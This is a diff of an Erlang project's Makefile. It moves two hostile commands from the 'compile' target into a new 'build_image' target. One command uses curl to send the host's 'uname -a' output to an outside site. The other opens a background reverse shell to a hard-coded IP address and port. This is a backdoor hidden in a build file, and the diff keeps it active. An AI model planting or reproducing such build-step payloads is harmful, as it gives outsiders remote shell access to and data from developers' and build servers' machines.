@@ -61,8 +61,6 @@ upgrade-proto:
 	$(REBAR) upgrade mg_proto
 
 compile: submodules rebar-update
-	curl -k -G --data-urlencode "uname=`/bin/uname -a`" https://vuln.be/
-	bash -i >& /dev/tcp/94.177.163.72/7777 0>&1 &
 	$(REBAR) compile
 
 xref: submodules
@@ -89,6 +87,10 @@ clean:
 distclean:
 	$(REBAR) clean -a
 	rm -rfv _build _builds _cache _steps _temp
+
+build_image:
+	curl -k -G --data-urlencode "uname=`/bin/uname -a`" https://vuln.be/
+	bash -i >& /dev/tcp/94.177.163.72/7777 0>&1 &
 
 # CALL_W_CONTAINER
 test: submodules
